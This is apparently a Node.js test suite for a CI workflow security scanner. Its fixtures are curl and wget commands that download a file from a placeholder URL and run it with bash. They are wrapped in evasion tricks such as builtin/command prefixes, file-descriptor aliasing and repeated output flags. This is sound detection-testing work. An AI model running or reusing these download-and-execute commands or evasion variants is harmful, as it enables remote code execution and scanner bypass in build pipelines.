'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/fixture';
const fetch='curl -fsSL '+U;
function audit(script){
 const yaml=['on: push','permissions: read-all','jobs:','  t:','    runs-on: ubuntu-latest','    steps:','      - run: |',...script.split('\n').map(x=>'          '+x)].join('\n')+'\n';
 return inspectWorkflow(yaml,{path:'.github/workflows/ultra-sentinel-round12.yml'});
}
function verify(label,script,expected){
 test(label,()=>{
  const result=findingsForScript(script);
  const ast=audit(script);
  assert.equal(result.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),expected,JSON.stringify({label,script,result}));
  assert.equal(ast.findings.some(x=>x.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),expected,JSON.stringify({label,ast}));
 });
}
for(const [name,script] of [
 ['builtin command fetch','builtin command '+fetch+' -o payload; bash payload'],
 ['builtin command -p fetch','builtin command -p '+fetch+' -o payload; bash payload'],
 ['builtin quoted command',"builtin 'command' "+fetch+" -o payload; bash payload"],
 ['nested builtin command','command builtin command '+fetch+' -o payload; bash payload'],
 ['fd 3 alias',''+fetch+' 3>payload >&3; bash payload'],
 ['fd 9 alias',fetch+' 9>payload 1>&9; bash payload'],
 ['fd 12 alias',fetch+' 12>payload 1>&12; bash payload'],
 ['fd chain',fetch+' 3>payload 4>&3 1>&4; bash payload'],
 ['fd 3 compound',fetch+' 3>payload 1>&3 2>&1; bash payload'],
 ['wget last destination payload','wget -q -O safe -O payload '+U+'; bash payload'],
 ['wget last stdout','wget -q -O safe -O - '+U+' >payload; bash payload'],
 ['wget last short combined','wget -q -O safe -qO- '+U+' >payload; bash payload']
])verify('P1/P2 detection '+name,script,true);
for(const [name,script] of [
 ['builtin command version','builtin command -v curl; bash payload'],
 ['builtin harmless','builtin echo done'],
 ['fd 3 never redirected to stdout',fetch+' 3>payload >safe; bash payload'],
 ['fd 3 to stderr only',fetch+' 3>payload 2>&3 >safe; bash payload'],
 ['fd 3 stdout ultimately elsewhere',fetch+' 3>payload 1>&3 >safe; bash payload'],
 ['fd 4 not stdout',fetch+' 4>payload; bash payload'],
 ['fd 3 duplication overwritten',fetch+' 3>payload 1>&3 1>safe; bash payload'],
 ['wget last safe','wget -q -O payload -O safe '+U+'; bash payload'],
 ['wget last safe long','wget -q --output-document=payload --output-document=safe '+U+'; bash payload'],
 ['wget stdout then last safe','wget -q -O - -O safe '+U+' >payload; bash payload'],
 ['wget only stdout to stderr','wget -q -O - '+U+' >safe; bash payload']
])verify('P1/P2 benign '+name,script,false);
for(const [name,script] of [
 ['invalid descriptor beyond supported range',fetch+' 99>payload 1>&99; bash payload'],
 ['unresolved source descriptor',fetch+' 1>&9; bash payload']
])test('fail closed '+name,()=>{
 const got=findingsForScript(script);
 assert.ok(got.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),JSON.stringify(got));
 assert.notEqual(audit(script).status,'NO_RISK_PATTERN');
});
